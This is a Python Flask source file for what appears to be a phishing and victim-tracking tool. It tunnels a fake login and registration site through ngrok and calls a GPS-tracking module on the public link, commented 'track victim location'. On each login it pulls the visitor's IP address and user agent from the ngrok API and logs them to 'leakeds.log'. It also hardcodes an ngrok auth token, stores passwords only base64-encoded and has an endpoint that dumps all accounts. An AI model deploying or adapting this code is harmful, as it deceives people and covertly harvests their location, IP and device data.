#!/usr/bin/env python3

from __future__ import print_function

from flask import Flask, render_template, redirect, request, session, url_for, jsonify, send_from_directory
from lib.core.configs.db import Mydb
from lib.core.gpstrack import GpsTrack
from pyngrok import ngrok
from datetime import datetime
import threading
import requests
import secrets
import base64
import re

# Ngrok authtoken
ngrok.set_auth_token("2DaDCSX4Fd0U7OEO6iR3CuFXVsU_5jgMHgoh7E9BkH21Rr9n2")

app = Flask(__name__)
fport = 5000
app.debug = False
app.config["SECRET_KEY"] = secrets.token_hex()
app.config["FLASK_ENV"] = "development"

public_url = ngrok.connect(fport).public_url

app.config["BASE_URL"] = public_url
print(" * ngrok tunnel \"{}\" -> \"http://127.0.0.1:{}\"".format(public_url, fport))

# track victim location
GpsTrack(shorten_url=public_url)

cursor = Mydb.cursor(dictionary=True) # mariadb

# Handle Errors
@app.errorhandler(403)
def error_permission(e):
    return "<head><title>403 Forbidden</title></head><body><h1>403 Forbidden</h1><p>You don\'t have permission to access this resource.</p></body>", 403

@app.errorhandler(404)
def page_not_found(e):
    return "<head><title>404 Not Found</title></head><body><h1>404 Not Found</h1><p>The resource could not be found.</p></p></body>", 404

@app.route("/")
def index():

    return "Hello World<br><br><a href=\"/login\">Login</a>"

# auto play audio
@app.route('/audio/<path:filename>')
def audio_file(filename):

    return send_from_directory(f"{app.root_path}/audio/", filename)

@app.route("/login", methods=["GET", "POST"])
def login():
    msg = None
    if request.method == "POST" and "login" in request.form and "password" in request.form:
        users = request.form["login"]
        password = request.form["password"]
        cursor.execute("SELECT * FROM accounts WHERE username = %s AND password = %s", (users, base64.b64encode(password.encode("utf-8")).decode("utf-8")))
        accounts = cursor.fetchone()
        if accounts:
            session["loggedin"] = True
            session["id"] = accounts["id"]
            session["username"] = accounts["username"]
            msg = "Logged in successfully!"
            # Get all info about the victim
            resp = requests.get("http://localhost:4040/api/requests/http").json()
            user_agents = resp["requests"][0]["request"]["headers"]["User-Agent"][0]
            ip_address = resp["requests"][0]["request"]["headers"]["X-Forwarded-For"][0]
            print(f" * Submission Date: {str(datetime.now())}")
            print(f" * User-Agent: {user_agents}")
            print(f" * Ip Address: {ip_address}")
            with open("leakeds.log", "a") as f:
                f.write(f"\nSubmission Date: {str(datetime.now())}\n")
                f.write(f"User-Agent: {user_agents}\n")
                f.write(f"Ip Address: {ip_address}\n")
            return render_template("index.html", msg=msg)
        else:
            msg = "Invalid login credential!"
    return render_template("login-form.html", msg=msg)

@app.route("/register", methods=["GET", "POST"])
def register():
    msg = None
    if request.method == 'POST' and 'username' in request.form and 'password' in request.form and 'confirm_password' in request.form and 'email' in request.form :
        username = request.form['username']
        password = request.form['password']
        email = request.form['email']
        cursor.execute('SELECT * FROM accounts WHERE username = %s', (username, ))
        account = cursor.fetchone()
        if account:
            msg = 'Account already exists !'
        elif not re.match(r'[^@]+@[^@]+\.[^@]+', email):
            msg = 'Invalid email address !'
        elif not re.match(r'[A-Za-z0-9]+', username):
            msg = 'Username must contain only characters and numbers !'
        elif not username or not password or not email:
            msg = 'Please fill out the form !'
        else:
            cursor.execute('INSERT INTO accounts (id, username, password, email, submission_date) VALUES (NULL, %s, %s, %s, NOW())', (username, base64.b64encode(password.encode("utf-8")).decode("utf-8"), email, ))
            Mydb.commit()
            msg = 'You have successfully registered !'
    elif request.method == 'POST':
        msg = 'Please fill out the form !'
    return render_template("register-form.html", msg=msg)

@app.route("/forgot-password", methods=["GET", "POST"])
def forgot_password():

    return render_template('forgot-pswd-form.html')

@app.route('/logout')
def logout():
    session.pop('loggedin', None)
    session.pop('user_id', None)
    session.pop('username', None)
    return redirect(url_for('index'))

# APIs for users 
@app.route("/api/v1/user", methods=["GET"])
def user():
    query_parameters = request.args
    user_id = query_parameters.get("id")
    if not session.get("loggedin") and not session.get("username"):
        return error_permission(403)
    if user_id:
        cursor.execute("SELECT * FROM accounts WHERE id = %s", (user_id,))
        accounts = cursor.fetchone()
    if not user_id:
        cursor.execute("SELECT * FROM accounts")
        accounts = cursor.fetchall()
    return jsonify(accounts)

if __name__ == '__main__':
    threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()